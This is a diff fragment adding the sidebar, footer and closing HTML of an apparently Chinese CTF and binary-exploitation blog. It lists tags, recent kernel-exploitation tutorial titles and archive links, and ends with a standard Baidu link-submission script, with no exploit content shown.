+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/BUUCTF/" rel="tag">BUUCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80/" rel="tag">C语言</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DASCTF/" rel="tag">DASCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Das/" rel="tag">Das</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IDA/" rel="tag">IDA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILE/" rel="tag">IO_FILE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LLVM/" rel="tag">LLVM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWNHUB/" rel="tag">PWNHUB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/UAF/" rel="tag">UAF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable/" rel="tag">pwnable</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rop/" rel="tag">rop</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unlink/" rel="tag">unlink</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A0%86/" rel="tag">堆</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%A9%E7%BF%BC%E6%9D%AF/" rel="tag">天翼杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%88/" rel="tag">栈</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" rel="tag">栈迁移</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="tag">格式化字符串</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%A5%A5%E4%BA%91%E6%9D%AF/" rel="tag">祥云杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%95%BF%E5%AE%89%E6%9D%AF/" rel="tag">长安杯</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-recent-posts">
+    <div class="widget-title"><span>Recent Posts</span></div>
+    <div class="widget-inner">
+      <ul>
+        
+          <li>
+            <a href="/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/">教你学内核-tty,seq结构体利用</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-linux%20kernel%20ROP%20%E4%B8%8B%E7%9A%84%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87/">教你学内核-linux kernel ROP 下的保护绕过</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-sudrv/">教你学内核-sudrv</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-qwb-core/">教你学内核-qwb-core</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/">教你用IDA</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-archive">
+    <div class="widget-title"><span>Archive</span></div>
+    <div class="widget-inner">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a></li></ul>
+    </div>
+  </div>
+
+
+    
+</div>
+
+<div id="backtop"><i class="icon icon-arrow-up"></i></div>
+            </aside>
+            
+        </div>
+    </div>
+
+    <footer class="footer">
+    <div class="footer-wave">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="#3c4859" fill-opacity="1" d="M0,160L60,181.3C120,203,240,245,360,240C480,235,600,181,720,186.7C840,192,960,256,1080,261.3C1200,267,1320,213,1380,186.7L1440,160L1440,320L1380,320C1320,320,1200,320,1080,320C960,320,840,320,720,320C600,320,480,320,360,320C240,320,120,320,60,320L0,320Z"></path></svg>
+    </div>
+
+    <div class="footer-wrap">
+        <div class="footer-inner"> 
+            -NIYAH- &copy; 2022<br>
+            Powered By Hexo · Theme By <a href="https://github.com/lh1me/hexo-theme-aomori" target="_blank">Aomori</a>
+        </div>
+    </div>
+
+</footer>
+
+
+
+
+
+
+<script src="/dist/build.js?1629946964125.js"></script>
+
+
+<script src="/dist/custom.js?1629946964125.js"></script>
+
+
+
+<!-- 百度链接提交 -->
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        }
+        else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+
+
+
+
+
+
+</body>
+
+</html>
